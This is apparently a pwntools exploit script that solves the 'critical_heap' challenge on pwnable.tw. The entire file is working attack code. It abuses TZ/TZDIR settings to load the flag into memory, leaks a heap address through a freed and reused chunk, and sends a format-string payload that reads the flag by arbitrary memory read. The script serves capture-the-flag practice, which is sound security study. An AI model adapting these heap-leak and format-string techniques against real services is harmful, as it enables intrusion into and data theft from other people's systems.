from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./critical_heap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	p = remote("chall.pwnable.tw","10500")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

def menu(choice):
	p.sendafter("Your choice : ",str(choice))

def add(typ,name,content = "\n"):
	menu(1)
	p.sendafter("Name of heap:",name)
	if typ == "system":
		menu(3)
	elif typ == "time":
		menu(2)
	else:
		menu(1)
		p.sendafter("Content of heap :",content)

def show(index):
	menu(2)
	p.sendafter("Index of heap :",str(index))

def edit(index,name):
	menu(3)
	p.sendafter("Index of heap :",str(index))
	p.sendafter("Name of heap:",name)

def free(index):
	menu(5)
	p.sendafter("Index of heap :",str(index))

def setenv(index,env,value):
	menu(4)
	p.sendafter("Index of heap :",str(index))
	menu(1)
	p.sendafter("Give me a name for the system heap :",env)
	p.sendafter("Give me a value for this name :",value)
	menu(5)

def playwithnormal(index,payload):
	menu(4)
	p.sendafter("Index of heap :",str(index))
	menu(2)
	p.sendafter("Content :",payload)
	menu(1)

def debugf():
	gdb.attach(p,"b *0x4021BC\nb __printf_chk")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add("system","systemaaa")
setenv(0,"TZ","flag")
if debug:
	setenv(0,"TZDIR","/home/critical_heap++")
else:
	setenv(0,"TZDIR","/home/critical_heap++")
#debugf()
add("system","systembbb")
free(1)
add("normal","a","b")
show(1)
p.recvuntil("Content : ")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
heap_base = leak_addr - 0x362
log.success("heap_base:" + hex(heap_base))
add("system","systembbb")
add("time","timebbbb")
if debug:
	target = heap_base + 0x6d0
else:
	target = heap_base + 0x6a0
payload = "%d"*(0x06 - 1 + 6 + 1) + "bb%s"
payload += (8 - (len(payload) % 8)) * "a"
payload += p64(target)
assert len(payload) <= 0x28
playwithnormal(1,payload)
if debug:
	debugf()
else:
	pass
info = p.recvuntil("*****************************",drop = True)
log.success("flag:" + info)
p.interactive()
